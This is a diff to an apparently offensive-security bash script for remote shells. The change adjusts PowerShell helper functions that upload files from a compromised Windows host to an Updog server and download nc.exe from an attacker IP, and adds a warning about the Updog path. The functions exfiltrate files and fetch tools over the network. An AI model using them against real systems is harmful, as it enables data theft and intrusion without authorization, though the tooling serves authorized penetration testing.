@@ -542,19 +542,19 @@ fi
 
     yellowprint "download http://192.168.1.14/nc.exe /windows/temp/nc.exe" 
     echo -en "\n\nYou can upload files to Updog by entering:\n\n"
-    yellowprint "upload /windows/system32/calc.exe http://192.168.1.14/upload"
-    echo "(Requires Updog. You need to add /upload to your target-URL)"
+    yellowprint "upload /windows/system32/calc.exe http://192.168.1.14/upload "
+    echo -e "This requires Updog. You need to add /upload to your target-URL. \nAlso, be aware of: Your updog-folder path $updog_dir will be sent in the requests!"
     greenprint "[Y/n]"
     read -r -n 1 ans
     case $ans in
     y)
-        func="function upload {\$f = \$args[0];\$uri = \$args[1];\$pa = '.';\$n = Split-Path \$f -Leaf;\$c = [System.IO.File]::ReadAlltext(\$f);\$bo = [System.Guid]::NewGuid().ToString();\$LF = \"\`r\`n\";\$bl = (\"--\$bo\",\"Content-Disposition: form-data; name=\`\"file\`\"; filename=\`\"\$n\`\"\",\"Content-Type: application/octet-stream\$LF\",\$c,\"--\$bo\",\"Content-Disposition: form-data; name=\`\"path\`\"\$LF\",\$pa,\"--\$bo--\$LF\") -join \$LF;\$r=Invoke-RestMethod -Uri \$uri -Method Post -ContentType \"multipart/form-data; boundary=\`\"\$bo\`\"\" -Body \$bl};function download {curl \$args[0] -o \$args[1] -UseBasicParsing};"
+        func="function upload {\$f = \$args[0];\$uri = \$args[1];\$pa = '$updog_dir';\$n = Split-Path \$f -Leaf;\$c = [System.IO.File]::ReadAlltext(\$f);\$bo = [System.Guid]::NewGuid().ToString();\$LF = \"\`r\`n\";\$bl = (\"--\$bo\",\"Content-Disposition: form-data; name=\`\"file\`\"; filename=\`\"\$n\`\"\",\"Content-Type: application/octet-stream\$LF\",\$c,\"--\$bo\",\"Content-Disposition: form-data; name=\`\"path\`\"\$LF\",\$pa,\"--\$bo--\$LF\") -join \$LF;\$r=Invoke-RestMethod -Uri \$uri -Method Post -ContentType \"multipart/form-data; boundary=\`\"\$bo\`\"\" -Body \$bl};function download {curl \$args[0] -o \$args[1] -UseBasicParsing};"
         ;;
     n)
         func=";"
         ;;
     "")
-        func="function upload {\$f = \$args[0];\$uri = \$args[1];\$pa = '.';\$n = Split-Path \$f -Leaf;\$c = [System.IO.File]::ReadAlltext(\$f);\$bo = [System.Guid]::NewGuid().ToString();\$LF = \"\`r\`n\";\$bl = (\"--\$bo\",\"Content-Disposition: form-data; name=\`\"file\`\"; filename=\`\"\$n\`\"\",\"Content-Type: application/octet-stream\$LF\",\$c,\"--\$bo\",\"Content-Disposition: form-data; name=\`\"path\`\"\$LF\",\$pa,\"--\$bo--\$LF\") -join \$LF;\$r=Invoke-RestMethod -Uri \$uri -Method Post -ContentType \"multipart/form-data; boundary=\`\"\$bo\`\"\" -Body \$bl};function download {curl \$args[0] -o \$args[1] -UseBasicParsing};"
+        func="function upload {\$f = \$args[0];\$uri = \$args[1];\$pa = '$updog_dir';\$n = Split-Path \$f -Leaf;\$c = [System.IO.File]::ReadAlltext(\$f);\$bo = [System.Guid]::NewGuid().ToString();\$LF = \"\`r\`n\";\$bl = (\"--\$bo\",\"Content-Disposition: form-data; name=\`\"file\`\"; filename=\`\"\$n\`\"\",\"Content-Type: application/octet-stream\$LF\",\$c,\"--\$bo\",\"Content-Disposition: form-data; name=\`\"path\`\"\$LF\",\$pa,\"--\$bo--\$LF\") -join \$LF;\$r=Invoke-RestMethod -Uri \$uri -Method Post -ContentType \"multipart/form-data; boundary=\`\"\$bo\`\"\" -Body \$bl};function download {curl \$args[0] -o \$args[1] -UseBasicParsing};"
         ;;
     *)
         exit;;
